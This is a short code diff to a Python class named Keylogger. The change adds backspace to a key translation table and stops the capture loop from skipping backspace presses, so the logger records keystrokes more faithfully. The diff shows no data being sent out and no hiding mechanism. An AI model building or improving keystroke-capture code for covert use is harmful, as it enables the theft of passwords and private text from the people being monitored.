@@ -14,7 +14,8 @@ TRANSLATION_TABLE = {
         "ctrl":"'CTRL'",
         "tab":"\t",
         "enter":"\n",
-        "alt":"'ALT'"
+        "alt":"'ALT'",
+        "backspace":"\b"
 }
 
 
@@ -101,7 +102,7 @@ class Keylogger:
             event = keyboard.read_event()
             name_len = len(event.name)
             if event.event_type == "down":
-                if event.name in ["shift", "backspace"]:
+                if event.name == "shift":
                     continue
                 if name_len == 1:
                     if keyboard.is_pressed("shift"):
